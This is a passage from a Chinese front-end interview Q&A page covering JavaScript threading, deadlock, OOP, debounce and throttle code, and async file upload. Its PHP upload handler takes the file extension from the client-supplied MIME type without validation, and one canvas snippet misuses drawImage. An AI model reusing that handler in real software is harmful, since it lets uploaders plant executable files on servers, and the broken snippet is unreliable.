举个例子：如果js被设计了多线程，如果有一个线程要修改一个dom元素，另一个线程要删除这个dom元素，此时浏览器就会一脸茫然，不知所措。所以，为了避免复杂性，从一诞生，JavaScript就是单线程，这已经成了这门语言的核心特征，将来也不会改变</p>\n<p><strong>扩展：</strong></p>\n<p>什么是进程？</p>\n<p>进程：是cpu分配资源的最小单位；（是能拥有资源和独立运行的最小单位）</p>\n<p>什么是线程？</p>\n<p>线程：是cpu调度的最小单位；（线程是建立在进程的基础上的一次程序运行单位，一个进程中可以有多个线程）</p>\n<p>浏览器是多进程的？</p>\n<p>放在浏览器中，每打开一个tab页面，其实就是新开了一个进程，在这个进程中，还有ui渲染线程，js引擎线程，http请求线程等。 所以，浏览器是一个多进程的。</p>\n<p>为了利用多核CPU的计算能力，HTML5提出Web Worker标准，允许JavaScript脚本创建多个线程，但是子线程完全受主线程控制，且不得操作DOM。所以，这个新标准并没有改变JavaScript单线程的本质。</p>\n<h3 id=\"41、死锁\"><a href=\"#41、死锁\" class=\"headerlink\" title=\"41、死锁\"></a>41、死锁</h3><p><strong>参考答案：</strong></p>\n<p>死锁是指两个或两个以上的进程在执行过程中，由于竞争资源而造成阻塞的现象，若无外力作用，它们都将无法继续执行</p>\n<p>产生原因</p>\n<ul>\n<li>竞争资源引起进程死锁</li>\n<li>可剥夺和非剥夺资源</li>\n<li>竞争非剥夺资源</li>\n<li>竞争临时性资源</li>\n<li>进程推进顺序不当</li>\n</ul>\n<p>产生条件</p>\n<ol>\n<li>互斥条件：涉及的资源是非共享的<ul>\n<li>涉及的资源是非共享的,一段时间内某资源只由一个进程占用,如果此时还有其它进程请求资源，则请求者只能等待，直至占有资源的进程用毕释放</li>\n</ul>\n</li>\n<li>不剥夺条件：不能强行剥夺进程拥有的资源<ul>\n<li>进程已获得的资源，在未使用完之前，不能被剥夺，只能在使用完时由自己释放</li>\n</ul>\n</li>\n<li>请求和保持条件：进程在等待一新资源时继续占有已分配的资源<ul>\n<li>指进程已经保持至少一个资源，但又提出了新的资源请求，而该资源已被其它进程占有，此时请求进程阻塞，但又对自己已获得的其它资源保持不放</li>\n</ul>\n</li>\n<li>环路等待条件：存在一种进程的循环链，链中的每一个进程已获得的资源同时被链中的下一个进程所请求 在发生死锁时，必然存在一个进程——资源的环形链</li>\n</ol>\n<p>解决办法</p>\n<p>只要打破四个必要条件之一就能有效预防死锁的发生</p>\n<h3 id=\"42、面向对象的三个特征，分别说一下什么意思\"><a href=\"#42、面向对象的三个特征，分别说一下什么意思\" class=\"headerlink\" title=\"42、面向对象的三个特征，分别说一下什么意思\"></a>42、面向对象的三个特征，分别说一下什么意思</h3><p><strong>参考答案：</strong></p>\n<p>概念：</p>\n<p><strong>封装：</strong>将对象运行所需的资源封装在程序对象中——基本上，是方法和数据。对象是“公布其接口”。其他附加到这些接口上的对象不需要关心对象实现的方法即可使用这个对象。这个概念就是“不要告诉我你是怎么做的，只要做就可以了。”对象可以看作是一个自我包含的原子。对象接口包括了公共的方法和初始化数据。</p>\n<p><strong>继承：</strong> 继承可以解决代码复用，让编程更加靠近人类思维。当多个类存在相同的属性(变量)和方法时，可以从这些类中抽象出父类，在父类中定义这些相同的属性和方法，所有的子类不需要重新定义这些属性和方法，只需要通过继承父类中的属性和方法。</p>\n<p><strong>多态：</strong> 多态是指一个引用(类型)在不同情况下的多种状态。也可以理解成：多态是指通过指向父类的引用，来调用在不同子类中实现的方法。</p>\n<p>特点：</p>\n<p><strong>封装</strong>可以隐藏实现细节，使得代码模块化；</p>\n<p><strong>继承</strong>可以扩展已存在的代码模块（类），它们的目的都是为了——代码重用。</p>\n<p><strong>多态</strong>就是相同的事物，调用其相同的方法，参数也相同时，但表现的行为却不同。多态分为两种，一种是行为多态与对象的多态</p>\n<h3 id=\"43、防抖和节流的原理和使用场景\"><a href=\"#43、防抖和节流的原理和使用场景\" class=\"headerlink\" title=\"43、防抖和节流的原理和使用场景\"></a>43、防抖和节流的原理和使用场景</h3><p><strong>参考答案：</strong></p>\n<p>函数防抖和函数节流：优化高频率执行js代码的一种手段，js中的一些事件如浏览器的resize、scroll，鼠标的mousemove、mouseover，input输入框的keypress等事件在触发时，会不断地调用绑定在事件上的回调函数，极大地浪费资源，降低前端性能。为了优化体验，需要对这类事件进行调用次数的限制。</p>\n<p><strong>防抖：</strong></p>\n<p>在事件被触发n秒后再执行回调，如果在这n秒内又被触发，则重新计时。</p>\n<p>根据函数防抖思路设计出第一版的最简单的防抖代码：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">var timer; &#x2F;&#x2F; 维护同一个timer\nfunction debounce(fn, delay) &#123;\n    clearTimeout(timer);\n    timer &#x3D; setTimeout(function()&#123;\n        fn();\n    &#125;, delay);\n&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>上面例子中的debounce就是防抖函数，在document中鼠标移动的时候，会在onmousemove最后触发的1s后执行回调函数testDebounce；如果我们一直在浏览器中移动鼠标（比如10s），会发现会在10 + 1s后才会执行testDebounce函数（因为clearTimeout(timer)），这个就是函数防抖。</p>\n<p>在上面的代码中，会出现一个问题，var timer只能在setTimeout的父级作用域中，这样才是同一个timer，并且为了方便防抖函数的调用和回调函数fn的传参问题，我们应该用闭包来解决这些问题。</p>\n<p>优化后的代码：</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">debounce</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">fn<span class=\"token punctuation\">,</span> delay</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">var</span> timer<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 维护一个 timer</span>\n    <span class=\"token keyword\">return</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">var</span> _this <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 取debounce执行作用域的this</span>\n        <span class=\"token keyword\">var</span> args <span class=\"token operator\">=</span> arguments<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>timer<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token function\">clearTimeout</span><span class=\"token punctuation\">(</span>timer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        timer <span class=\"token operator\">=</span> <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token function\">fn</span><span class=\"token punctuation\">.</span><span class=\"token function\">apply</span><span class=\"token punctuation\">(</span>_this<span class=\"token punctuation\">,</span> args<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 用apply指向调用debounce的对象，相当于_this.fn(args);</span>\n        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> delay<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>使用闭包后，解决传参和封装防抖函数的问题，这样就可以在其他地方随便将需要防抖的函数传入debounce了。</p>\n<p><strong>节流：</strong></p>\n<p>每隔一段时间，只执行一次函数。</p>\n<ul>\n<li><p>定时器实现节流函数：</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">throttle</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">fn<span class=\"token punctuation\">,</span> delay</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">var</span> timer<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">var</span> _this <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">var</span> args <span class=\"token operator\">=</span> arguments<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>timer<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        timer <span class=\"token operator\">=</span> <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token function\">fn</span><span class=\"token punctuation\">.</span><span class=\"token function\">apply</span><span class=\"token punctuation\">(</span>_this<span class=\"token punctuation\">,</span> args<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            timer <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 在delay后执行完fn之后清空timer，此时timer为假，throttle触发可以进入计时器</span>\n        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> delay<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p>时间戳实现节流函数：</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">throttle</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">fn<span class=\"token punctuation\">,</span> delay</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">var</span> previous <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// 使用闭包返回一个函数并且用到闭包函数外面的变量previous</span>\n    <span class=\"token keyword\">return</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">var</span> _this <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">var</span> args <span class=\"token operator\">=</span> arguments<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">var</span> now <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Date</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>now <span class=\"token operator\">-</span> previous <span class=\"token operator\">></span> delay<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token function\">fn</span><span class=\"token punctuation\">.</span><span class=\"token function\">apply</span><span class=\"token punctuation\">(</span>_this<span class=\"token punctuation\">,</span> args<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            previous <span class=\"token operator\">=</span> now<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>\n</ul>\n<p><strong>异同比较</strong></p>\n<p>相同点：</p>\n<ul>\n<li>都可以通过使用 setTimeout 实现。</li>\n<li>目的都是，降低回调执行频率。节省计算资源。</li>\n</ul>\n<p>不同点：</p>\n<ul>\n<li>函数防抖，在一段连续操作结束后，处理回调，<strong>利用clearTimeout 和 setTimeout实现</strong>。函数节流，在一段连续操作中，<strong>每一段时间只执行一次</strong>，频率较高的事件中使用来提高性能。</li>\n<li>函数防抖关注一定时间连续触发的事件只在最后执行一次，而函数节流侧重于一段时间内只执行一次。</li>\n</ul>\n<p>常见应用场景</p>\n<p><strong>函数防抖的应用场景:</strong></p>\n<p>连续的事件，只需触发一次回调的场景有：</p>\n<ul>\n<li>搜索框搜索输入。只需用户最后一次输入完，再发送请求</li>\n<li>手机号、邮箱验证输入检测</li>\n<li>窗口大小Resize。只需窗口调整完成后，计算窗口大小。防止重复渲染。</li>\n</ul>\n<p>函数节流的应用场景:</p>\n<p>间隔一段时间执行一次回调的场景有：</p>\n<ul>\n<li>滚动加载，加载更多或滚到底部监听</li>\n<li>谷歌搜索框，搜索联想功能</li>\n<li>高频点击提交，表单重复提交</li>\n</ul>\n<h3 id=\"44、文件异步上传怎么实现\"><a href=\"#44、文件异步上传怎么实现\" class=\"headerlink\" title=\"44、文件异步上传怎么实现\"></a>44、文件异步上传怎么实现</h3><p><strong>参考答案：</strong></p>\n<h4 id=\"1-普通表单上传\"><a href=\"#1-普通表单上传\" class=\"headerlink\" title=\"1.普通表单上传\"></a>1.普通表单上传</h4><p>使用PHP来展示常规的表单上传是一个不错的选择。首先构建文件上传的表单，并指定表单的提交内容类型为<code>enctype=&quot;multipart/form-data&quot;</code>，表明表单需要上传二进制数据。</p>\n<pre class=\"line-numbers language-html\" data-language=\"html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>form</span> <span class=\"token attr-name\">action</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>/index.php<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">method</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>POST<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">enctype</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>multipart/form-data<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>file<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>myfile<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>submit<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>form</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>然后编写<code>index.php</code>上传文件接收代码，使用<code>move_uploaded_file</code>方法即可(php大法好…)</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\">$imgName <span class=\"token operator\">=</span> <span class=\"token string\">'IMG'</span><span class=\"token punctuation\">.</span><span class=\"token function\">time</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token string\">'.'</span><span class=\"token punctuation\">.</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string\">'image/'</span><span class=\"token punctuation\">,</span><span class=\"token string\">''</span><span class=\"token punctuation\">,</span>$_FILES<span class=\"token punctuation\">[</span><span class=\"token string\">\"myfile\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string\">'type'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n$fileName <span class=\"token operator\">=</span>  <span class=\"token string\">'upload/'</span><span class=\"token punctuation\">.</span>$imgName<span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// 移动上传文件至指定upload文件夹下，并根据返回值判断操作是否成功</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">move_uploaded_file</span><span class=\"token punctuation\">(</span>$_FILES<span class=\"token punctuation\">[</span><span class=\"token string\">'myfile'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> $fileName<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    echo $fileName<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n    echo <span class=\"token string\">\"nonn\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>form表单上传大文件时，很容易遇见服务器超时的问题。通过xhr，前端也可以进行异步上传文件的操作，一般由两个思路。</p>\n<h4 id=\"2-文件编码上传\"><a href=\"#2-文件编码上传\" class=\"headerlink\" title=\"2.文件编码上传\"></a>2.文件编码上传</h4><p>第一个思路是将文件进行编码，然后在服务端进行解码，之前写过一篇在前端实现图片压缩上传的博客，其主要实现原理就是将图片转换成base64进行传递</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">var</span> imgURL <span class=\"token operator\">=</span> <span class=\"token constant\">URL</span><span class=\"token punctuation\">.</span><span class=\"token function\">createObjectURL</span><span class=\"token punctuation\">(</span>file<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nctx<span class=\"token punctuation\">.</span><span class=\"token function\">drawImage</span><span class=\"token punctuation\">(</span>imgURL<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// 获取图片的编码，然后将图片当做是一个很长的字符串进行传递</span>\n<span class=\"token keyword\">var</span> data <span class=\"token operator\">=</span> canvas<span class=\"token punctuation\">.</span><span class=\"token function\">toDataURL</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"image/jpeg\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0.5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>在服务端需要做的事情也比较简单，首先解码base64，然后保存图片即可</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\">$imgData <span class=\"token operator\">=</span> $_REQUEST<span class=\"token punctuation\">[</span><span class=\"token string\">'imgData'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n$base64 <span class=\"token operator\">=</span> <span class=\"token function\">explode</span><span class=\"token punctuation\">(</span><span class=\"token string\">','</span><span class=\"token punctuation\">,</span> $imgData<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n$img <span class=\"token operator\">=</span> <span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span>$base64<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n$url <span class=\"token operator\">=</span> <span class=\"token string\">'./test.jpg'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span>$url<span class=\"token punctuation\">,</span> $img<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token function\">json_encode</span><span class=\"token punctuation\">(</span><span class=\"token function\">array</span><span class=\"token punctuation\">(</span>\n        <span class=\"token parameter\">url</span> <span class=\"token operator\">=></span> $url\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>base64编码的缺点在于其体积比原图片更大（因为Base64将三个字节转化成四个字节，因此编码后的文本，会比原文本大出三分之一左右），对于体积很大的文件来说，上传和解析的时间会明显增加。</p>\n<p>更多关于base64的知识，可以参考Base64笔记。</p>\n<p>除了进行base64编码，还可以在前端直接读取文件内容后以二进制格式上传</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token comment\">// 读取二进制文件</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">readBinary</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">text</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n   <span class=\"token keyword\">var</span> data <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ArrayBuffer</span><span class=\"token punctuation\">(</span>text<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token keyword\">var</span> ui8a <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Uint8Array</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">var</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> text<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span> \n     ui8a<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>text<span class=\"token punctuation\">.</span><span class=\"token function\">charCodeAt</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xff</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token punctuation\">&#125;</span>\n   console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>ui8a<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">var</span> reader <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">FileReader</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nreader<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">onload</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">readBinary</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>result<span class=\"token punctuation\">)</span> <span class=\"token comment\">// 读取result或直接上传</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token comment\">// 把从input里读取的文件内容，放到fileReader的result字段里</span>\nreader<span class=\"token punctuation\">.</span><span class=\"token function\">readAsBinaryString</span><span class=\"token punctuation\">(</span>file<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"3-formData异步上传\"><a href=\"#3-formData异步上传\" class=\"headerlink\" title=\"3.formData异步上传\"></a>3.formData异步上传</h4><p>FormData对象主要用来组装一组用 XMLHttpRequest发送请求的键&#x2F;值对，可以更加灵活地发送Ajax请求。可以使用FormData来模拟表单提交。</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">let</span> files <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>target<span class=\"token punctuation\">.</span>files <span class=\"token comment\">// 获取input的file对象</span>\n<span class=\"token keyword\">let</span> formData <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">FormData</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nformData<span class=\"token punctuation\">.</span><span class=\"token function\">append</span><span class=\"token punctuation\">(</span><span class=\"token string\">'file'</span><span class=\"token punctuation\">,</span> file<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\naxios<span class=\"token punctuation\">.</span><span class=\"token function\">post</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> formData<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>服务端处理方式与直接form表单请求基本相同。</p>\n<h4 id=\"4-iframe无刷新页面\"><a href=\"#4-iframe无刷新页面\" class=\"headerlink\" title=\"4.iframe无刷新页面\"></a>4.iframe无刷新页面</h4><p>在低版本的浏览器（如IE）上，xhr是不支持直接上传formdata的，因此只能用form来上传文件，而form提交本身会进行页面跳转，这是因为form表单的<a href=\"https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/form\">target</a>属性导致的，其取值有</p>\n<ul>\n<li><p>_self，默认值，在相同的窗口中打开响应页面</p>\n</li>\n<li><p>_blank，在新窗口打开</p>\n</li>\n<li><h4 id=\"parent，在父窗口打开\"><a href=\"#parent，在父窗口打开\" class=\"headerlink\" title=\"_parent，在父窗口打开\"></a>_parent，在父窗口打开</h4></li>\n<li><p>_top，在最顶层的窗口打开</p>\n</li>\n<li><p><code>framename</code>，在指定名字的iframe中打开</p>\n</li>\n</ul>\n<p>如果需要让用户体验异步上传文件的感觉，可以通过<code>framename</code>指定iframe来实现。把form的target属性设置为一个看不见的iframe，那么返回的数据就会被这个iframe接受，因此只有该iframe会被刷新，至于返回结果，也可以通过解析这个iframe内的文本来获取。</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">upload</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">var</span> now <span class=\"token operator\">=</span> <span class=\"token operator\">+</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Date</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">var</span> id <span class=\"token operator\">=</span> <span class=\"token string\">'frame'</span> <span class=\"token operator\">+</span> now\n    <span class=\"token function\">$</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"body\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">append</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">&lt;iframe style=\"display:none;\" name=\"</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">$&#123;</span>id<span class=\"token interpolation-punctuation punctuation\">&#125;</span></span><span class=\"token string\">\" id=\"</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">$&#123;</span>id<span class=\"token interpolation-punctuation punctuation\">&#125;</span></span><span class=\"token string\">\" /></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">var</span> $form <span class=\"token operator\">=</span> <span class=\"token function\">$</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"#myForm\"</span><span class=\"token punctuation\">)</span>\n    $form<span class=\"token punctuation\">.</span><span class=\"token function\">attr</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token string-property property\">\"action\"</span><span class=\"token operator\">:</span> <span class=\"token string\">'/index.php'</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string-property property\">\"method\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"post\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string-property property\">\"enctype\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"multipart/form-data\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string-property property\">\"encoding\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"multipart/form-data\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string-property property\">\"target\"</span><span class=\"token operator\">:</span> id\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">submit</span><span class=\"token punctuation\">(</span><span class=\"token 